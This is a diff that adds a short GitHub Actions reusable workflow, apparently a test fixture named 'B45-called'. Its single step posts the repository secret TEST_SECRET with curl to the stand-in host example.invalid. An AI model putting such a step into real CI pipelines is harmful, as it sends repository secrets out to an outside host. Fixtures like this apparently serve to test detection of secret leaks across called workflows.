@@ -1,0 +1,14 @@
+name: B45-called
+
+on:
+  workflow_call:
+
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: "${{ secrets.TEST_SECRET }}"
+
+    steps:
+      - run: |
+          curl --data "$SECRET" https://example.invalid/collect
